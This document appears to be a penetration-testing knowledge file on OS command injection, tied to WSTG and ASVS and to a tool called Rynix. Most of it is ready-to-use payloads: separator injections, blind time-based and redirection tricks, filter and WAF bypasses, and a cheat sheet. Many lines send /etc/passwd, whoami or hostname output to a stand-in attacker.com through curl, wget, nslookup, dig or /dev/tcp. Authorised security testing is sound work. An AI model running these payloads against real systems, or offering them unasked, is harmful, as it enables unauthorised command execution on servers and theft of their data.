---
id: PS-CMDI
category: OS command injection
lab_count: 5
wstg_refs: [WSTG-INPV-12]
---

# OS Command Injection: Attack Technique Reference

OS command injection (shell injection) occurs when an application passes unsanitized user input to a system shell. The attacker appends or injects OS commands that execute on the server with the privileges of the web application process.

---

## 1. Detection

### 1A. Identify Injection Points

Look for parameters that interact with backend system operations:

- File operations: `filename=`, `path=`, `dir=`, `file=`
- Network operations: `host=`, `ip=`, `url=`, `domain=`
- System utilities: `ping=`, `lookup=`, `email=`, `to=`, `from=`
- Feedback/contact forms: `email`, `subject`, `message` fields
- PDF generators, image processors, file converters

### 1B. Canary Detection

Inject a unique harmless string to confirm the parameter reaches a shell context:

```
# Echo canary — if the string appears in the response, shell is executing
& echo CMDI_CANARY_7x9k2 &
| echo CMDI_CANARY_7x9k2
; echo CMDI_CANARY_7x9k2 ;
```

### 1C. Time-Based Detection

When output is not returned in the response, use time delays:

```
# Linux — ping causes 10-second delay
& ping -c 10 127.0.0.1 &
|| ping -c 10 127.0.0.1 ||
; sleep 10 ;
`sleep 10`
$(sleep 10)

# Windows — ping causes 10-second delay
& ping -n 10 127.0.0.1 &
|| ping -n 10 127.0.0.1 ||
| ping -n 10 127.0.0.1
```

If the response takes ~10 seconds longer than normal, command injection is confirmed.

### 1D. Out-of-Band Detection

Trigger a DNS lookup or HTTP callback to an attacker-controlled server:

```
# DNS lookup
& nslookup attacker.com &
|| nslookup attacker.com ||
`nslookup attacker.com`
$(nslookup attacker.com)

# HTTP callback
& curl http://attacker.com/cmdi-confirm &
& wget http://attacker.com/cmdi-confirm &
```

---

## 2. Techniques

### 2A. In-Band Command Injection

The command output is returned directly in the HTTP response. This is the simplest and most immediately exploitable form.

**Approach:** Append a command using a shell separator. The output of the injected command appears in the response body.

```
# Product stock check vulnerable parameter
productId=1&storeId=1|whoami
productId=1&storeId=1;id
productId=1&storeId=1`id`

# Using each separator family
; whoami                 # Sequential execution (Unix)
| whoami                 # Pipe — only injected command output shown
|| whoami                # OR — executes if prior command fails
& whoami                 # Background — both commands execute
&& whoami                # AND — executes if prior command succeeds
`whoami`                 # Backtick substitution (Unix)
$(whoami)                # Dollar substitution (Unix)
```

> Lab refs: PS-CMDI-01

### 2B. Blind: Time-Based

No output is returned. Confirm execution by observing response time differences.

```
# Linux
email=test@example.com||ping+-c+10+127.0.0.1||
email=test@example.com;sleep+10;
email=test@example.com%0asleep+10
email=test@example.com`sleep 10`

# Windows
email=test@example.com||ping+-n+10+127.0.0.1||
email=test@example.com&timeout+/t+10
```

**Verification:** Send the same request without the delay payload. Compare response times. A ~10 second difference confirms injection.

> Lab refs: PS-CMDI-02

### 2C. Blind: Output Redirection

Redirect command output to a file within the web root, then retrieve it via HTTP.

```
# Redirect output to web-accessible directory
email=test@example.com||whoami+>+/var/www/static/output.txt||
email=test@example.com;id+>+/var/www/html/output.txt;
email=test@example.com|cat+/etc/passwd+>+/var/www/images/data.txt

# Then retrieve via browser/curl
GET /static/output.txt HTTP/1.1
```

**Requirements:** You need to know (or guess) a writable, web-accessible directory. Common paths:

| Framework | Typical Web Root |
|-----------|-----------------|
| Apache | `/var/www/html/`, `/var/www/static/` |
| Nginx | `/usr/share/nginx/html/`, `/var/www/images/` |
| Node.js | `/app/public/`, `/app/static/` |
| Python | `/app/static/`, `/tmp/` (if served) |

> Lab refs: PS-CMDI-03

### 2D. Blind: Out-of-Band (OAST)

Exfiltrate data through DNS or HTTP to an external server you control.

```
# DNS exfiltration — command output becomes subdomain
email=test@example.com||nslookup+`whoami`.attacker.com||
email=test@example.com;nslookup+$(whoami).attacker.com;
email=test@example.com`nslookup $(id|base64).attacker.com`

# HTTP exfiltration
email=test@example.com||curl+http://attacker.com/?d=$(whoami)||
email=test@example.com;wget+http://attacker.com/?d=$(cat+/etc/passwd|base64);
email=test@example.com|curl+http://attacker.com/$(hostname)|

# Multi-line data via POST
email=test@example.com;curl+-X+POST+-d+@/etc/passwd+http://attacker.com/exfil;
```

**DNS exfiltration format:** The output of the injected command is prepended as a subdomain. For example, if `whoami` returns `www-data`, the DNS lookup resolves `www-data.attacker.com`.

> Lab refs: PS-CMDI-04, PS-CMDI-05

---

## 3. OS-Specific Payloads

### 3A. Useful Commands

| Purpose | Linux | Windows |
|---------|-------|---------|
| Current user | `whoami` | `whoami` |
| User ID | `id` | `whoami /priv` |
| Hostname | `hostname` | `hostname` |
| OS version | `uname -a` | `ver` |
| OS release | `cat /etc/os-release` | `systeminfo` |
| Network config | `ifconfig` or `ip addr` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` or `ps aux` | `tasklist` |
| ARP table | `arp -a` | `arp -a` |
| Routing table | `route -n` or `ip route` | `route print` |
| DNS config | `cat /etc/resolv.conf` | `ipconfig /displaydns` |
| Environment vars | `env` or `printenv` | `set` |
| Read file | `cat /etc/passwd` | `type C:\windows\win.ini` |
| List directory | `ls -la /` | `dir C:\` |
| Find files | `find / -name "*.conf"` | `dir /s /b C:\*.conf` |
| Current directory | `pwd` | `cd` |

### 3B. Proof-of-Concept Payloads (Safe)

```
# Linux — identity confirmation
; whoami ;
; id ;
; uname -a ;
; cat /etc/passwd ;

# Windows — identity confirmation
& whoami &
& ver &
& type C:\windows\win.ini &
& ipconfig &
```

---

## 4. Shell Metacharacter Reference

### 4A. Command Separators

| Character | OS | Behavior |
|-----------|-----|----------|
| `;` | Unix/Linux | Sequential execution — runs both commands regardless |
| `\n` (0x0a) | Unix/Linux | Newline — starts a new command |
| `&` | Both | Background execution (Unix) / sequential (Windows) |
| `&&` | Both | AND — second runs only if first succeeds |
| `\|` | Both | Pipe — first command output piped to second |
| `\|\|` | Both | OR — second runs only if first fails |
| `` ` `` | Unix/Linux | Backtick command substitution |
| `$()` | Unix/Linux | Dollar-paren command substitution |

### 4B. Inline Execution

These execute a command and substitute its output:

```
# Backtick substitution
`whoami`

# Dollar-paren substitution
$(whoami)

# Nested substitution
$(echo $(whoami))
```

### 4C. Redirection Operators

| Operator | Purpose |
|----------|---------|
| `>` | Redirect stdout to file (overwrite) |
| `>>` | Redirect stdout to file (append) |
| `<` | Redirect file to stdin |
| `2>` | Redirect stderr to file |
| `2>&1` | Redirect stderr to stdout |

---

## 5. WAF Bypass Techniques

### 5A. Whitespace Bypass

When spaces are filtered:

```
# $IFS (Internal Field Separator) — acts as space in bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
ls${IFS}-la

# Tab character
;cat%09/etc/passwd
;ls%09-la

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Redirect-based (no spaces needed)
cat</etc/passwd
```

### 5B. Command Name Bypass

When specific command names are blacklisted:

```
# Single-quote insertion (bash ignores quotes within command names)
w'h'o'a'm'i
w"h"o"a"m"i
/bin/c'a't /etc/passwd

# Backslash insertion
w\ho\am\i
c\at /etc/passwd
/b\in/\ca\t /etc/passwd

# Wildcard substitution
/bin/ca? /etc/passwd          # ? matches single char
/b?n/c?t /etc/passwd
/bin/c[a]t /etc/passwd
/???/??t /etc/passwd          # matches /bin/cat

# Variable concatenation
a=wh;b=oami;$a$b
a=c;b=at;$a$b /etc/passwd

# Path-based execution
/bin/whoami
/usr/bin/id
```

### 5C. Encoding Bypass

```
# URL encoding of separators
%0a = newline
%26 = &
%7c = |
%3b = ;

# Double URL encoding
%250a = newline (double-encoded)
%2526 = & (double-encoded)

# Hex encoding in bash
echo -e '\x69\x64'           # prints "id"
$'\x69\x64'                  # executes "id"
$(printf '\x69\x64')         # executes "id"

# Octal encoding
$'\151\144'                   # executes "id"
$(printf '\151\144')          # executes "id"

# Base64 execution
echo d2hvYW1p | base64 -d | sh          # executes "whoami"
bash -c "$(echo d2hvYW1p | base64 -d)"  # executes "whoami"
```

### 5D. Separator Alternatives

When common separators are filtered, try less common ones:

```
# Newline (URL-encoded)
param=value%0aid

# Carriage return + newline
param=value%0d%0aid

# Null byte separation (some parsers)
param=value%00id

# Unicode separators
param=value%E2%80%8Bid        # zero-width space

# Batch/cmd specific (Windows)
param=value%1Aid              # SUB character
```

### 5E. Data Exfiltration When curl/wget Blocked

```
# Using nslookup for DNS exfil
nslookup $(whoami).attacker.com

# Using dig
dig $(whoami).attacker.com

# Using ping (hostname leak via ICMP)
ping -c 1 $(whoami).attacker.com

# Using Python (if available)
python -c "import socket;socket.getaddrinfo('$(whoami).attacker.com',80)"

# Write to /dev/tcp (bash built-in)
echo $(whoami) > /dev/tcp/attacker.com/80
```

---

## 6. Context-Specific Injection

### 6A. Quoted String Context

When input is placed inside quotes in the shell command:

```
# Break out of single quotes (cannot escape inside single quotes)
'; whoami; echo '
' || whoami || echo '

# Break out of double quotes
"; whoami; echo "
" || whoami || echo "
"$(whoami)"

# Backtick works inside double quotes
"`whoami`"
```

### 6B. Argument Injection

When your input becomes a command argument:

```
# If the command is: ping <your-input>
-c 1 127.0.0.1; whoami
127.0.0.1 -c 1; whoami

# Option injection (if the command supports dangerous flags)
--version; whoami
-h; whoami
```

---

## 7. Quick Reference: Injection Cheat Sheet

### Minimum Viable Payloads (test all separators)

```
;id
|id
||id
&id
&&id
`id`
$(id)
%0aid
;id;
|id|
```

### Blind Confirmation (time-based)

```
;sleep 10;
|sleep 10|
||sleep 10||
&sleep 10&
&&sleep 10&&
`sleep 10`
$(sleep 10)
%0asleep 10
```

### Blind Confirmation (OOB callback)

```
;nslookup attacker.com;
|nslookup attacker.com|
||curl http://attacker.com||
`nslookup attacker.com`
$(nslookup attacker.com)
```

### Data Exfiltration

```
;curl http://attacker.com/$(whoami);
||nslookup $(whoami).attacker.com||
`nslookup $(cat /etc/passwd|base64).attacker.com`
;curl -X POST -d @/etc/passwd http://attacker.com/exfil;
```
## Rynix workflow

1. `get_technique_guide` for `os-command-injection` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

